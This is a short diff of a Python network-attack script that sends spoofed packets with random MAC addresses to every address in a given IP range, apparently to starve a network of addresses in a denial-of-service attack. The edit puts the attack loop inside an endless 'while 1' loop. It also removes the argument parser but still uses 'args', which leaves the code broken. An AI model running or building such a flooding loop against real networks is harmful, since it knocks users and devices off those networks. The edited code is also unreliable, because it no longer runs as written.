@@ -33,21 +33,16 @@ def send_and_listen(packet, ip):
                 pass
 
 def main():
-    parser = argparse.ArgumentParser(description='Get arguments')
-    parser.add_argument('ip_network', type=str, help='enter IP address range in CIDR notation (e.g. 192.168.1.0/24)')
-    parser.add_argument('my_ip', type=str, help='Enter your own IP')
-    args = parser.parse_args()
+    ip_network = args.ip_network #enter IP address range in CIDR notation (e.g. 192.168.1.0/24)
+    my_ip = args.my_ip #my_ip
 
-    ip_network = args.ip_network
-    my_ip = args.my_ip
-
-
-    for ip in ipaddress.IPv4Network(ip_network):
-        if str(ip) != my_ip:
-            print("Starving "+ str(ip))
-            mac = RandMAC()
-            packet = SpoofedPacket(mac, ip)
-            send_and_listen(packet, ip)
+    while 1: 
+        for ip in ipaddress.IPv4Network(ip_network):
+            if str(ip) != my_ip:
+                print("Starving "+ str(ip))
+                mac = RandMAC()
+                packet = SpoofedPacket(mac, ip)
+                send_and_listen(packet, ip)
 
 
 
